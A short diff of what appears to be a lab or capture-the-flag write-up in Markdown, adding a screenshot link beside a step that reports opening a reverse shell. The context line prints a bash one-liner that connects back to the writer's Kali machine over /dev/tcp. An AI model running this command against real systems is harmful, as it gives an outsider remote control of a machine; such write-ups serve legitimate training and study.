@@ -219,7 +219,7 @@ Enumerated top 200 UDP ports:
 
 #### -I then typed " "/bin/bash -i >& /dev/tcp/[tun0 kali IP]/6379 0>&1" '',started a penelope listener on my kali machine and received a reverse shell:
 
-
+![](Pasted%20image%2020221110135022.png)
 
 ---
 
